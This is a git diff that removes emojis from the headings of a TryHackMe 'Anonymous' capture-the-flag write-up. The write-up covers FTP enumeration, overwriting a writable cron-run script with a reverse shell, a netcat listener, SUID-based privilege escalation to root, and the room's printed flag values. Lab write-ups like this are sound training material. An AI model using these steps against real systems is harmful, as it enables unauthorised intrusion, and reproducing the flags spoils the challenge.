@@ -1,7 +1,7 @@
 
-# 🧪 TryHackMe — Anonymous
+# TryHackMe - Anonymous
 
-## 📌 Overview
+## Overview
 
 **Platform:** TryHackMe  
 **Room:** Anonymous  
@@ -13,7 +13,7 @@ This lab demonstrates how **simple service misconfigurations**, when combined, c
 
 ---
 
-## 🎯 Objectives
+## Objectives
 
 - Identify exposed services and misconfigurations
 - Achieve initial access using legitimate service functionality
@@ -23,7 +23,7 @@ This lab demonstrates how **simple service misconfigurations**, when combined, c
 
 ---
 
-## 🔍 Initial Enumeration
+## Initial Enumeration
 
 ### Network Scanning
 
@@ -46,7 +46,7 @@ enum4linux <target_ip>
 - Shared resources accessible
 - No sensitive credentials or execution vectors discovered
 
-🧠 **Takeaway**:
+**Takeaway**:
 Not every exposed service is a viable entry point. Enumeration should inform decisions, not rush exploitation.
 
 ## 📂 FTP Enumeration (Primary Attack Vector)
@@ -66,10 +66,10 @@ Files of interest:
 - `removed_files.log`
 - `to_do.txt`
 
-⚠️ **Critical Finding**
+**Critical Finding**
 A **writable script** (`clean.sh`) **executed by the system** is a direct path to Remote Code Execution.
 
-## 🚪 Initial Access — Reverse Shell via Script Injection
+## Initial Access — Reverse Shell via Script Injection
 ### Payload Preparation
 The existing `clean.sh` script was overwritten with a reverse shell payload:
 
@@ -87,7 +87,7 @@ nc -lvnp 4444
 ```
 Once the script executed, a shell was obtained successfully.
 
-## 🚩 Step 4 — Capturing the User Flag
+## Step 4 - Capturing the User Flag
 With shell access established:
 
 ```bash
@@ -97,7 +97,7 @@ cat user.txt
 ```bash
 90d6f992585815ff991e68748c414740
 ```
-## ⬆️ Privilege Escalation
+## Privilege Escalation
 ### SUID Enumeration
 ```bash
 find / -user root -perm -u=s 2>/dev/null
@@ -125,7 +125,7 @@ root
 ```
 ✔ Privilege escalation successful.
 
-## 🚩 Step 6 — Capturing the Root Flag
+## Step 6 - Capturing the Root Flag
 ```bash
 cd /root
 cat root.txt
@@ -135,7 +135,7 @@ cat root.txt
 ```bash
 4d930091c31a622a7ed10f27999af363
 ```
-## 🧠 Key Takeaways
+## Key Takeaways
 - Anonymous FTP access combined with writable scripts is extremely dangerous
 - Enumeration should guide exploitation, not the other way around
 - SMB access can be a false positive path
